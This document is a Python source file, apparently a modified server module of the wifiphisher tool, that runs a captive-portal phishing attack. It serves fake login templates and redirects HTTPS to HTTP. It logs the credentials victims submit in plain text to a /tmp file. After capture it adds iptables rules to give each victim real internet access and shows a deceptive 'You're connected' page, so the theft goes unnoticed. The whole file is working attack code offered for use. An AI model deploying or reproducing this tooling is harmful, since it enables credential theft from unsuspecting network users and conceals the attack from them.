"""
phishinghttp - Tornado HTTP server for captive portal phishing.

Based on upstream wifiphisher, with post-authentication internet grant:
after a victim submits credentials, iptables rules are added to bypass
the captive portal redirect for that client, granting real internet access.
"""

import logging
import json
import subprocess
from tornado.escape import json_decode
import tornado.ioloop
import tornado.web
import tornado.httpserver
import os.path
import wifiphisher.common.uimethods as uimethods
import wifiphisher.common.extensions as extensions
import wifiphisher.common.constants as constants

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)

# Track which client IPs have already been granted internet
_granted_clients = set()


def grant_internet(client_ip):
    """
    Grant full internet access to a client after credential capture.
    """
    if client_ip in _granted_clients:
        return
    _granted_clients.add(client_ip)

    print("[*] Setting up internet for %s..." % client_ip)

    # 1) Skip captive portal redirects for this client
    subprocess.call(
        'iptables -t nat -I PREROUTING 1 -s %s -j RETURN' % client_ip,
        shell=True)
    print("[+]   PREROUTING RETURN added")

    # 2) Allow forwarding for this client
    subprocess.call(
        'iptables -I FORWARD 1 -s %s -j ACCEPT' % client_ip,
        shell=True)
    subprocess.call(
        'iptables -I FORWARD 1 -d %s -m state --state RELATED,ESTABLISHED -j ACCEPT'
        % client_ip,
        shell=True)
    print("[+]   FORWARD ACCEPT added")

    # 3) Ensure ip_forward is enabled
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    except (IOError, OSError):
        pass

    # 4) MASQUERADE — generic, works on any interface
    subprocess.call(
        'iptables -t nat -C POSTROUTING -j MASQUERADE 2>/dev/null || '
        'iptables -t nat -A POSTROUTING -j MASQUERADE',
        shell=True)
    print("[+]   MASQUERADE added")

    print("[+] Internet granted to %s" % client_ip)
    logger.info("Granted internet to %s", client_ip)


class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        gw = constants.NETWORK_GW_IP
        port = constants.PORT
        self.redirect("http://%s:%s/" % (gw, port))


class BackendHandler(tornado.web.RequestHandler):
    """
    Validate the POST requests from client by the uimethods
    """

    def initialize(self, em):
        self.em = em

    def post(self):
        json_obj = json_decode(self.request.body)
        response_to_send = {}
        backend_methods = self.em.get_backend_funcs()
        for func_name in list(json_obj.keys()):
            if func_name in backend_methods:
                callback = getattr(backend_methods[func_name], func_name)
                response_to_send[func_name] = callback(json_obj[func_name])
            else:
                response_to_send[func_name] = "NotFound"

        self.write(json.dumps(response_to_send))


class CaptivePortalHandler(tornado.web.RequestHandler):
    def get(self):
        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("GET request from {0} for {1}\n".format(
                self.request.remote_ip, self.request.full_url()))
        logger.info("GET request from %s for %s", self.request.remote_ip,
                    self.request.full_url())

    def post(self):
        global terminate

        # check the http POST request header contains the Content-Type
        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        # check if this is a valid phishing post request
        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
            post_data = tornado.escape.url_unescape(self.request.body)
            log_file_path = "/tmp/wifiphisher-webserver.tmp"
            with open(log_file_path, "a+") as log_file:
                log_file.write("POST request from {0} with {1}\n".format(
                    self.request.remote_ip, post_data))
                logger.info("POST request from %s with %s",
                            self.request.remote_ip, post_data)

            creds.append(post_data)
            terminate = True

            # --- POST-AUTH: grant internet and redirect ---
            client_ip = self.request.remote_ip
            grant_internet(client_ip)

            check_url = "http://connectivitycheck.gstatic.com/generate_204"

            self.write(
                '<!DOCTYPE html>'
                '<html><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,initial-scale=1">'
                '<meta http-equiv="refresh" content="3;url=' + check_url + '">'
                '<title>Connection Successful</title>'
                '<style>'
                '*{margin:0;padding:0;box-sizing:border-box}'
                'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",'
                'Roboto,Helvetica,Arial,sans-serif;background:#f5f5f7;'
                'display:flex;justify-content:center;align-items:center;'
                'min-height:100vh;color:#1d1d1f}'
                '.container{text-align:center;padding:48px 32px;max-width:420px;'
                'width:90%}'
                '.icon{width:72px;height:72px;margin:0 auto 24px;'
                'background:#34c759;border-radius:50%;display:flex;'
                'align-items:center;justify-content:center}'
                '.icon svg{width:36px;height:36px;fill:none;stroke:#fff;'
                'stroke-width:3;stroke-linecap:round;stroke-linejoin:round}'
                'h1{font-size:22px;font-weight:600;margin-bottom:8px}'
                '.subtitle{font-size:15px;color:#86868b;line-height:1.5;'
                'margin-bottom:28px}'
                '.progress-bar{width:100%;height:3px;background:#e5e5ea;'
                'border-radius:2px;overflow:hidden;margin-bottom:20px}'
                '.progress-bar .fill{height:100%;background:#34c759;'
                'border-radius:2px;animation:load 2.5s ease-in-out forwards}'
                '@keyframes load{0%{width:0}100%{width:100%}}'
                '.footer{font-size:12px;color:#aeaeb2}'
                '</style></head>'
                '<body>'
                '<div class="container">'
                '<div class="icon"><svg viewBox="0 0 24 24">'
                '<polyline points="20 6 9 17 4 12"/></svg></div>'
                '<h1>You&#8217;re connected</h1>'
                '<p class="subtitle">You now have internet access.<br>'
                'This window will close automatically.</p>'
                '<div class="progress-bar"><div class="fill"></div></div>'
                '<p class="footer">Secured by network authentication</p>'
                '</div>'
                '<script>'
                'setTimeout(function(){'
                'window.location.href="' + check_url + '";'
                '},2800);'
                '</script>'
                '</body></html>'
            )
            return

        # Non-credential POST: serve the template as usual
        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())


def runHTTPServer(ip, port, ssl_port, t, em):
    global template
    template = t

    # Get all the UI funcs and set them to uimethods module
    for f in em.get_ui_funcs():
        setattr(uimethods, f.__name__, f)

    app = tornado.web.Application(
        [
            (r"/backend/.*", BackendHandler, {
                "em": em
            }),
            (r"/.*", CaptivePortalHandler),
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False,
        ui_methods=uimethods)
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
    https_server = tornado.httpserver.HTTPServer(
        ssl_app,
        ssl_options={
            "certfile": constants.PEM,
            "keyfile": constants.PEM,
        })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
